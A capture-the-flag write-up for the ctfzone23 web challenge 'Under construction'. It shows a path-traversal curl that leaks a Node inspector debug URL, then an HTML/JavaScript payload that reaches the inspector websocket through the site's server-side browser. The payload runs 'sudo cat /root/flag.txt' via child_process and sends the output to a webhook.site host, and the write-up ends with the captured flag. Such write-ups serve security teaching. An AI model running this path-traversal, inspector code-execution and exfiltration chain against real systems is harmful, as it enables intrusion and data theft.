---
title: "ctfzone23 web/Under construction"
publishDate: "13 Aug 2023"
description: "Author: cpp.dog"
tags: ["web", "ctfzone23"]
---

#### Description
We started the development of a new task but havent completed it yet.

The debug version works on the site. We believe there is no way to get the flag now, but you can try!

#### Code inspection

Here's the most important code of our challenge.

`Dockerfile`
```Docker
RUN echo "ctfzone{REDACTED}" > /root/flag.txt
RUN echo "ubuntu ALL = (root) NOPASSWD: /bin/cat /root/flag.txt" >> /etc/sudoers
...
CMD ["bash","-c","node --inspect app.js  1>app-logs.out 2>app-logs.err"]
```

So we can't read `/root/flag.txt` without running `sudo cat`, also the output of `node --inspect` is written to `app-logs.err`. Let's try to access it.

```bash
curl --path-as-is http://web-under-construction-ins1.ctfz.one/../app-logs.err

Debugger listening on ws://127.0.0.1:9229/0937204c-d978-4306-87db-a0915561d563
For help, see: https://nodejs.org/en/docs/inspector
```

That's good, we can access the devtools endpoint to execute any code we want, including bash commands.

```bash
curl 'http://web-under-construction-ins1.ctfz.one/browser?url=https://cpp.dog/static/ctf.html'
```

#### XSS code
```html
<!DOCTYPE html>
<html>
<head>
</head>
<body>
<script>
  window.ws = new WebSocket('ws://127.0.0.1:9229/0937204c-d978-4306-87db-a0915561d563')
  ws.onerror = (e) => {
    fetch("https://webhook.site/[REDACTED]?e=" + btoa(e.toString()))
  }
  ws.onmessage = (e) => {
    fetch("https://webhook.site/[REDACTED]?e=" + btoa(e.data))
  }

  ws.onopen = () => {
    ws.send(JSON.stringify(
      {
        id: 1,
        // Eval js code
        method: "Runtime.evaluate",
        params: {
          // This is important for require()
          includeCommandLineAPI: true, 
          expression: `
(function(){
    cp = require("child_process");          
    result = cp.execSync("sudo /bin/cat /root/flag.txt" ); 
    return new TextDecoder().decode(result);
})();`
        }
      }
    ))
  }

</script>
</body>
</html>
```

#### Flag
`ctfzone{d3bug_m0d3_1s_c00l_f0r_CTF}`